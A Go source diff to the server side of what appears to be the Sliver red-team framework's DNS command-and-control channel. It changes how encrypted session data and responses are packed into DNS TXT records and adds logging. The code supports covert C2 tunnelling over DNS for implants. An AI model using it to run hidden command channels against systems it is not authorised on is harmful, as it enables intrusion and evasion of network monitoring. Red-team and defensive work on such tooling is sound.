@@ -11,6 +11,7 @@ import (
 	"bytes"
 	"crypto/sha256"
 	"crypto/x509"
+	"math"
 	"sort"
 
 	"encoding/base32"
@@ -85,7 +86,7 @@ type DNSSession struct {
 func (s *DNSSession) isReplayAttack(ciphertext []byte) bool {
 	sha := sha256.New()
 	sha.Write(ciphertext)
-	digest := base64.StdEncoding.EncodeToString(sha.Sum(nil))
+	digest := base64.RawStdEncoding.EncodeToString(sha.Sum(nil))
 	if _, ok := s.replay[digest]; ok {
 		return true
 	}
@@ -173,7 +174,7 @@ func handleTXT(domain string, subdomain string, req *dns.Msg) *dns.Msg {
 		}
 		txt := &dns.TXT{
 			Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: 0},
-			Txt: []string{result},
+			Txt: result,
 		}
 		resp.Answer = append(resp.Answer, txt)
 
@@ -241,17 +242,17 @@ func getFieldSubdata(fields []string) ([]string, error) {
 // --------------------------- DNS SESSION START ---------------------------
 
 // Returns an confirmation value (e.g. exit code 0 non-0) and error
-func startDNSSession(domain string, fields []string) (string, error) {
+func startDNSSession(domain string, fields []string) ([]string, error) {
 	log.Printf("[start session] fields = %#v", fields)
 
 	msgType, err := getFieldMsgType(fields)
 	if err != nil {
-		return "1", err
+		return []string{"1"}, err
 	}
 
 	nonce, err := getFieldNonce(fields)
 	if err != nil {
-		return "1", err
+		return []string{"1"}, err
 	}
 
 	if !strings.HasPrefix(msgType, "_") {
@@ -263,13 +264,13 @@ func startDNSSession(domain string, fields []string) (string, error) {
 	// sessionInit messages, but I don't think it's an issue ...
 	encryptedSessionInit, err := dnsSessionInitReassemble(nonce)
 	if err != nil {
-		return "1", err
+		return []string{"1"}, err
 	}
 
-	publicKeyPEM, privateKeyPEM, err := GetServerRSACertificatePEM("slivers", domain)
+	publicKeyPEM, privateKeyPEM, err := GetServerRSACertificatePEM("slivers", domain, false)
 	if err != nil {
 		log.Printf("Failed to fetch rsa private key")
-		return "1", err
+		return []string{"1"}, err
 	}
 	publicKeyBlock, _ := pem.Decode([]byte(publicKeyPEM))
 	log.Printf("RSA Fingerprint: %s", fingerprintSHA256(publicKeyBlock))
@@ -279,11 +280,13 @@ func startDNSSession(domain string, fields []string) (string, error) {
 	sessionInitData, err := cryptography.RSADecrypt(encryptedSessionInit, privateKey)
 	if err != nil {
 		log.Printf("Failed to decrypt session init msg")
-		return "1", err
+		return []string{"1"}, err
 	}
 
 	sessionInit := &pb.DNSSessionInit{}
 	proto.Unmarshal(sessionInitData, sessionInit)
+
+	log.Printf("Received new session in request")
 
 	sliver := &Sliver{
 		ID:        getHiveID(),
@@ -294,6 +297,7 @@ func startDNSSession(domain string, fields []string) (string, error) {
 
 	aesKey, _ := cryptography.AESKeyFromBytes(sessionInit.Key)
 	sessionID := dnsSessionID()
+	log.Printf("Starting new DNS session with id = %s", sessionID)
 	dnsSessionsMutex.Lock()
 	(*dnsSessions)[sessionID] = &DNSSession{
 		ID:          sessionID,
@@ -305,33 +309,38 @@ func startDNSSession(domain string, fields []string) (string, error) {
 	dnsSessionsMutex.Unlock()
 
 	encryptedSessionID, _ := cryptography.GCMEncrypt(aesKey, []byte(sessionID))
-	encodedSessionID := base64.RawStdEncoding.EncodeToString(encryptedSessionID)
-	return encodedSessionID, nil
+	result, err := dnsSendOnce(encryptedSessionID)
+	if err != nil {
+		log.Printf("Failed to encode message into single result %v", err)
+		return []string{"1"}, err
+	}
+
+	return result, nil
 }
 
 // The domain is only a segment of the startDNSSession message, so we just store the data
-func dnsSessionInitSegment(fields []string) (string, error) {
+func dnsSessionInitSegment(fields []string) ([]string, error) {
 	initReassemblerMutex.Lock()
 	defer initReassemblerMutex.Unlock()
 
 	nonce, _ := getFieldNonce(fields)
 	index, err := getFieldSeq(fields)
 	if err != nil {
-		return "1", err
+		return []string{"1"}, err
 	}
 	subdata, err := getFieldSubdata(fields)
 	if err != nil {
-		return "1", err
+		return []string{"1"}, err
 	}
 	if _, ok := (*initReassembler)[nonce]; !ok {
 		(*initReassembler)[nonce] = &map[int][]string{}
 	}
 	if reasm, ok := (*initReassembler)[nonce]; ok {
 		(*reasm)[index] = subdata
-		return "0", nil
+		return []string{"0"}, nil
 	}
 	log.Printf("Invalid nonce (session init segment): %#v", nonce)
-	return "1", errors.New("Invalid nonce (session init segment)")
+	return []string{"1"}, errors.New("Invalid nonce (session init segment)")
 }
 
 // Client should have sent all of the data, attempt to reassemble segments
@@ -362,7 +371,7 @@ func dnsSessionInitReassemble(nonce string) ([]byte, error) {
 // --------------------------- DNS SESSION RECV ---------------------------
 
 func getDomainKeyFor(domain string) (string, int) {
-	certPEM, _, _ := GetServerRSACertificatePEM("slivers", domain)
+	certPEM, _, _ := GetServerRSACertificatePEM("slivers", domain, false)
 	blockID, blockSize := storeSendBlocks(certPEM)
 	log.Printf("Encoded cert into %d blocks with ID = %s", blockSize, blockID)
 	return blockID, blockSize
@@ -370,7 +379,27 @@ func getDomainKeyFor(domain string) (string, int) {
 
 // --------------------------- DNS SESSION SEND ---------------------------
 
-// Send blocks of data via DNS TXT responses
+// Send all response data in a single TXT record, limited to 65535 bytes
+func dnsSendOnce(rawData []byte) ([]string, error) {
+	if 65535 <= base64.RawStdEncoding.EncodedLen(len(rawData)) {
+		return nil, errors.New("Response too large to encode into one TXT record")
+	}
+	data := base64.RawStdEncoding.EncodeToString(rawData)
+	log.Printf("Encoding single resp: %#v", data)
+	txts := []string{}
+	size := int(math.Ceil(float64(len(data)) / 255.0))
+	for index := 0; index < size; index++ {
+		start := index * 255
+		stop := start + 255
+		if len(data) <= stop {
+			stop = len(data)
+		}
+		txts = append(txts, data[start:stop])
+	}
+	return txts, nil
+}
+
+// Send blocks of data via multiple DNS TXT responses
 func dnsSendBlocks(blockID string, startIndex string, stopIndex string) []string {
 	start, err := strconv.Atoi(startIndex)
 	if err != nil {
@@ -456,18 +485,9 @@ func generateBlockID() string {
 	return string(blockID)
 }
 
-// Wrapper around GCMEncrypt & Base32 encode
-func sessionDecrypt(sessionKey cryptography.AESKey, data string) ([]byte, error) {
-	encryptedData, err := base32.StdEncoding.DecodeString(data)
-	if err != nil {
-		return nil, err
-	}
-	return cryptography.GCMDecrypt(sessionKey, encryptedData)
-}
-
 func fingerprintSHA256(block *pem.Block) string {
 	hash := sha256.Sum256(block.Bytes)
-	b64hash := base64.StdEncoding.EncodeToString(hash[:])
+	b64hash := base64.RawStdEncoding.EncodeToString(hash[:])
 	return strings.TrimRight(b64hash, "=")
 }
 
